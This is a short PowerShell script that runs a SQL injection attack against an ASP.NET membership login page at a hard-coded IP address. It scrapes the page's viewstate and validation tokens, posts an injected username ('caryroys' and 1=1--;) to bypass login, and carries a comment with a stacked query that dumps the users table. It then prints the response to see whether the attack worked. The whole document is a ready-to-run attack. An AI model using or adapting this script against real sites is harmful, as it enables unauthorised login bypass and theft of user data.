$uri = "http://40.89.250.30/MembershipSite/LogIn.aspx"

Add-Type -Assembly System.Web

$headers = @{}

$headers["Accept"] = "text/html, application/xhtml+xml"

$body = "__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE={0}&__VIEWSTATEGENERATOR={1}&__EVENTVALIDATION={2}&LoginControl%24UserName={3}&LoginControl%24Password={4}&LoginControl%24LoginButton=Log+In"

#Since this is an ASP .Net form, we have to grab a few things before we try and log in.
$response = invoke-webrequest -Uri $uri -Method GET -Headers $headers -UseBasicParsing
$response
#Highly specific to how this page is coded, walk the form to get asp.net viewstate details to pass to login
foreach($child in $response.InputFields)
{
    switch($child.name)
    {
        "__VIEWSTATE" {$viewstate = [System.Web.HttpUtility]::UrlEncode($child.value)}

    }
}


foreach($child in $response.InputFields)
{
    switch($child.id)
    {
        "__EVENTVALIDATION" {$eventvalidation = [System.Web.HttpUtility]::UrlEncode($child.value)}
        "__VIEWSTATEGENERATOR" {$viewstategenerator = [System.Web.HttpUtility]::UrlEncode($child.value)}
    }
}

#our naughty query we're trying to get the site to run
#select count(*) from users where username = 'caryroys'; select * from users--;' and password = '99C884B90F6D2C6086075661A84F11798D0BDDF6'

$username = "caryroys' and 1=1--;"
$password = "Testing123"

$headers = @{}

$headers["content-type"] = "application/x-www-form-urlencoded"

$body = $body -f $viewstate, $viewstategenerator, $eventvalidation, $username, $password

$response = invoke-webrequest -Uri $uri -Method POST -body $body -UseBasicParsing

#evaluate if login successful - or if extra data showed up in page content.

$response.RawContent
$response.Headers
